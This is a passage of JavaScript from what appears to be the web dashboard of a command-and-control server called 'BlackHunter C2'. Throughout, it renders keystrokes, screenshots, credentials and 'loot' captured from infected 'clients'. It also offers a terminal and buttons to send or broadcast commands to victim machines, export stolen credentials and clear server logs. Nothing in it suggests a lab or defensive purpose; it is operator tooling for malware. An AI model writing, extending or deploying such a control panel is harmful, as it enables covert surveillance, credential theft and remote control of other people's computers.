                    <div class="gallery-item-meta">${Utils.timeAgo(shot.captured_at)}</div>
                </div>
                <div class="gallery-item-overlay">
                    <div class="gallery-item-overlay-icon">🔍</div>
                </div>
            </div>
        `).join('');
    },

    view(path, title) {
        Modal.showImage(`/screenshots/${path}`, `Screenshot - ${title}`);
    },
};

// =============================================
// KEYLOGS
// =============================================

const Keylogs = {
    render() {
        const tbody = document.getElementById('keylogs-tbody');

        if (!State.keylogs.length) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="4" class="empty-table">
                        <div class="empty-state">
                            <span class="empty-icon">⌨️</span>
                            <span>No keystrokes captured</span>
                        </div>
                    </td>
                </tr>
            `;
            return;
        }

        tbody.innerHTML = State.keylogs.map(log => `
            <tr>
                <td>${Utils.escapeHtml(Utils.truncate(log.window_title || 'Unknown', 40))}</td>
                <td class="text-mono">${Utils.escapeHtml(Utils.truncate(log.keystrokes || '', 60))}</td>
                <td class="text-mono">${Utils.truncate(log.client_id || 'N/A', 12)}</td>
                <td class="text-muted">${Utils.timeAgo(log.captured_at)}</td>
            </tr>
        `).join('');
    },
};

// =============================================
// TERMINAL
// =============================================

const Terminal = {
    history: [],
    historyIndex: -1,

    init() {
        const input = document.getElementById('terminal-input');
        if (!input) return;

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.execute(input.value);
                input.value = '';
                this.historyIndex = -1;
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                this.navigateHistory(-1, input);
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                this.navigateHistory(1, input);
            }
        });
    },

    navigateHistory(direction, input) {
        if (!this.history.length) return;

        if (this.historyIndex === -1) {
            this.historyIndex = this.history.length;
        }

        this.historyIndex += direction;

        if (this.historyIndex < 0) this.historyIndex = 0;
        if (this.historyIndex >= this.history.length) {
            this.historyIndex = this.history.length;
            input.value = '';
            return;
        }

        input.value = this.history[this.historyIndex];
    },

    async execute(command) {
        if (!command.trim()) return;

        this.history.push(command);
        this.write(`└─# ${command}`, 'info');

        const parts = command.trim().split(/\s+/);
        const cmd = parts[0].toLowerCase();
        const args = parts.slice(1);

        switch (cmd) {
            case 'help':
                this.showHelp();
                break;

            case 'clear':
                this.clear();
                break;

            case 'list':
            case 'clients':
                this.showClients();
                break;

            case 'select':
                if (args[0]) {
                    Clients.select(args[0]);
                    this.write(`Selected: ${args[0]}`, 'success');
                } else {
                    this.write('Usage: select <client_id>', 'error');
                }
                break;

            case 'send':
                if (State.selectedClient && args.length) {
                    await DataManager.sendCommand(State.selectedClient, args.join(' '));
                    this.write(`Sent: ${args.join(' ')}`, 'success');
                } else {
                    this.write('No client selected. Use: select <client_id>', 'error');
                }
                break;

            case 'broadcast':
                if (args.length) {
                    await DataManager.broadcast(args.join(' '));
                    this.write(`Broadcast: ${args.join(' ')}`, 'success');
                } else {
                    this.write('Usage: broadcast <command>', 'error');
                }
                break;

            case 'stats':
                this.showStats();
                break;

            case 'kill':
                if (args[0]) {
                    await DataManager.killClient(args[0]);
                    this.write(`Killed: ${args[0]}`, 'warning');
                } else {
                    this.write('Usage: kill <client_id>', 'error');
                }
                break;

            case 'refresh':
                await DataManager.refreshAll();
                this.write('Refreshed all data', 'success');
                break;

            case 'clear-logs':
                await API.endpoints.clearLogs();
                this.write('Logs cleared', 'success');
                break;

            case 'exit':
                this.write('Use the shutdown button to stop the server', 'warning');
                break;

            default:
                this.write(`Unknown command: ${cmd}. Type 'help' for available commands.`, 'error');
        }
    },

    write(text, type = '') {
        const output = document.getElementById('terminal-output');
        const line = document.createElement('div');
        line.className = `terminal-line ${type}`;
        line.textContent = text;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    },

    writeHtml(html, type = '') {
        const output = document.getElementById('terminal-output');
        const line = document.createElement('div');
        line.className = `terminal-line ${type}`;
        line.innerHTML = html;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
    },

    clear() {
        const output = document.getElementById('terminal-output');
        output.innerHTML = `
            <div class="terminal-line welcome">
                <span class="terminal-prompt">┌──(root㉿blackhunter)-[~]</span>
            </div>
            <div class="terminal-line welcome">
                <span class="terminal-prompt">└─# </span>
                <span>Terminal cleared</span>
            </div>
            <div class="terminal-line">&nbsp;</div>
        `;
    },

    showHelp() {
        this.write('');
        this.write('Available Commands:', 'info');
        this.write('  help                    Show this help');
        this.write('  list, clients           List all connected clients');
        this.write('  select <id>             Select a client');
        this.write('  send <command>          Send command to selected client');
        this.write('  broadcast <command>     Send to all clients');
        this.write('  stats                   Show statistics');
        this.write('  kill <id>               Disconnect a client');
        this.write('  refresh                 Refresh all data');
        this.write('  clear                   Clear terminal');
        this.write('  clear-logs              Clear server logs');
        this.write('');
    },

    showClients() {
        this.write('');
        this.write(`Connected Clients (${State.clients.length}):`, 'info');
        this.write('');

        State.clients.forEach(c => {
            const marker = State.selectedClient === c.client_id ? '►' : ' ';
            this.write(`  ${marker} ${c.client_id.padEnd(20)} ${(c.ip || 'N/A').padEnd(18)} ${c.hostname || 'unknown'}`);
        });

        this.write('');
    },

    showStats() {
        const stats = State.stats;
        this.write('');
        this.write('Server Statistics:', 'info');
        this.write(`  Total Clients:      ${stats.total_clients || 0}`);
        this.write(`  Active Clients:     ${stats.active_clients || 0}`);
        this.write(`  Total Commands:     ${stats.total_commands || 0}`);
        this.write(`  Total Files:        ${stats.total_files || 0}`);
        this.write(`  Total Credentials:  ${stats.total_credentials || 0}`);
        this.write(`  Total Loot:         ${stats.total_loot || 0}`);
        this.write(`  Data Transferred:   ${Utils.formatBytes(stats.total_bytes || 0)}`);
        this.write('');
    },
};

// =============================================
// NAVIGATION
// =============================================

const Navigation = {
    init() {
        document.querySelectorAll('.nav-item').forEach(item => {
            item.addEventListener('click', (e) => {
                e.preventDefault();
                const view = item.dataset.view;
                if (view) this.switchView(view);
            });
        });
    },

    switchView(viewName) {
        // Update nav
        document.querySelectorAll('.nav-item').forEach(item => {
            item.classList.toggle('active', item.dataset.view === viewName);
        });

        // Update views
        document.querySelectorAll('.view').forEach(view => {
            view.classList.toggle('active', view.id === `view-${viewName}`);
        });

        State.currentView = viewName;

        // Load data for the view
        switch (viewName) {
            case 'dashboard':
                DataManager.loadStats();
                DataManager.loadClients();
                break;
            case 'clients':
                DataManager.loadClients();
                break;
            case 'commands':
                DataManager.loadCommands();
                break;
            case 'files':
                DataManager.loadFiles();
                break;
            case 'credentials':
                DataManager.loadCredentials();
                break;
            case 'loot':
                DataManager.loadLoot();
                break;
            case 'screenshots':
                DataManager.loadScreenshots();
                break;
            case 'keylogs':
                DataManager.loadKeylogs();
                break;
        }
    },
};

// =============================================
// EVENT BINDINGS
// =============================================

function bindEvents() {
    // Refresh button
    document.getElementById('btn-refresh')?.addEventListener('click', () => {
        DataManager.refreshAll();
        Toast.info('Refreshed', 'Data reloaded');
    });

    // Shutdown button
    document.getElementById('btn-shutdown')?.addEventListener('click', () => {
        Modal.confirm(
            'Shutdown Server',
            'Are you sure you want to shutdown the C2 server?',
            async () => {
                try {
                    await API.endpoints.shutdown();
                    Toast.warning('Shutdown', 'Server is shutting down...');
                } catch (err) {
                    Toast.error('Shutdown Failed', err.message);
                }
            }
        );
    });

    // Send command
    document.getElementById('btn-send-command')?.addEventListener('click', () => {
        CommandPanel.send();
    });

    // Enter key on command input
    document.getElementById('command-input')?.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            CommandPanel.send();
        }
    });

    // Quick command chips
    document.querySelectorAll('.btn-chip').forEach(chip => {
        chip.addEventListener('click', () => {
            const cmd = chip.dataset.cmd;
            if (cmd) {
                document.getElementById('command-input').value = cmd;
                CommandPanel.send();
            }
        });
    });

    // Broadcast button
    document.getElementById('btn-broadcast')?.addEventListener('click', () => {
        Modal.open('modal-broadcast');
    });

    document.getElementById('btn-send-broadcast')?.addEventListener('click', async () => {
        const cmd = document.getElementById('broadcast-command').value.trim();
        if (cmd) {
            await DataManager.broadcast(cmd);
            document.getElementById('broadcast-command').value = '';
            Modal.close('modal-broadcast');
        }
    });

    // Kill all clients
    document.getElementById('btn-kill-all')?.addEventListener('click', () => {
        Clients.killAll();
    });

    // Refresh buttons
    document.getElementById('btn-refresh-clients')?.addEventListener('click', () => DataManager.loadClients());
    document.getElementById('btn-refresh-files')?.addEventListener('click', () => DataManager.loadFiles());
    document.getElementById('btn-refresh-creds')?.addEventListener('click', () => DataManager.loadCredentials());
    document.getElementById('btn-refresh-loot')?.addEventListener('click', () => DataManager.loadLoot());
    document.getElementById('btn-refresh-screenshots')?.addEventListener('click', () => DataManager.loadScreenshots());
    document.getElementById('btn-refresh-keylogs')?.addEventListener('click', () => DataManager.loadKeylogs());

    // Export buttons
    document.getElementById('btn-export-creds')?.addEventListener('click', () => Credentials.export());
    document.getElementById('btn-export-loot')?.addEventListener('click', () => Loot.export());

    // Clear buttons
    document.getElementById('btn-clear-activity')?.addEventListener('click', () => ActivityFeed.clear());
    document.getElementById('btn-clear-commands')?.addEventListener('click', () => Commands.clear());
    document.getElementById('btn-terminal-clear')?.addEventListener('click', () => Terminal.clear());

    // Modal close buttons
    document.querySelectorAll('.modal-close, [data-modal]').forEach(el => {
        el.addEventListener('click', () => {
            const modalId = el.dataset.modal;
            if (modalId) Modal.close(modalId);
        });
    });

    // Close modal on backdrop click
    document.querySelectorAll('.modal').forEach(modal => {
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                Modal.close(modal.id);
            }
        });
    });

    // ESC to close modals
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            Modal.closeAll();
        }
    });

    // Copy result
    document.getElementById('btn-copy-result')?.addEventListener('click', async () => {
        const output = document.getElementById('modal-result-output').textContent;
        await Utils.copyToClipboard(output);
        Toast.success('Copied', 'Result copied to clipboard');
    });

    // Settings
    document.getElementById('setting-auto-refresh')?.addEventListener('change', (e) => {
        State.autoRefresh = e.target.checked;
        Toast.info('Settings', `Auto-refresh ${State.autoRefresh ? 'enabled' : 'disabled'}`);
    });

    document.getElementById('setting-notifications')?.addEventListener('change', (e) => {
        State.notifications = e.target.checked;
        Toast.info('Settings', `Notifications ${State.notifications ? 'enabled' : 'disabled'}`);
    });

    document.getElementById('btn-clear-logs')?.addEventListener('click', () => {
        Modal.confirm('Clear Logs', 'Delete all server logs?', async () => {
            await API.endpoints.clearLogs();
            Toast.success('Logs Cleared', '');
        });
    });

    document.getElementById('btn-vacuum-db')?.addEventListener('click', async () => {
        await API.endpoints.vacuumDb();
        Toast.success('Database Vacuumed', '');
    });

    document.getElementById('btn-backup-db')?.addEventListener('click', async () => {
        await API.endpoints.backupDb();
        Toast.success('Backup Created', '');
    });

    document.getElementById('btn-shutdown-server')?.addEventListener('click', () => {
        Modal.confirm('Shutdown Server', 'Are you sure?', async () => {
            await API.endpoints.shutdown();
            Toast.warning('Shutting down...', '');
        });
    });
}

// =============================================
// INITIALIZATION
// =============================================

async function init() {
    Logger.info('Initializing BlackHunter C2 Dashboard...');

    // Initialize components
    Toast.init();
    Navigation.init();
    Terminal.init();
    bindEvents();

    // Connect WebSocket
    WebSocketManager.connect();

    // Initial data load
    await DataManager.refreshAll();

    // Add initial activity
    ActivityFeed.add('Dashboard initialized', 'success');

    // Start auto-refresh
    setInterval(() => {
        if (State.autoRefresh && State.currentView === 'dashboard') {
            DataManager.loadStats();
            DataManager.loadClients();
        }
    }, CONFIG.REFRESH_INTERVAL);

    // Update clock
    setInterval(() => {
        document.getElementById('footer-time').textContent = Utils.formatTime(Date.now());
    }, 1000);

    Logger.success('Dashboard ready');
    Toast.success('Connected', 'BlackHunter C2 Dashboard');
}

// Start when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}

// =============================================
// EXPOSE TO WINDOW (for inline onclick handlers)
// =============================================

window.Clients = Clients;
window.Commands = Commands;
window.Files = Files;
window.Credentials = Credentials;
window.Loot = Loot;
window.Screenshots = Screenshots;
window.Keylogs = Keylogs;
window.Terminal = Terminal;
window.DataManager = DataManager;
window.Toast = Toast;
window.Modal = Modal;
window.Utils = Utils;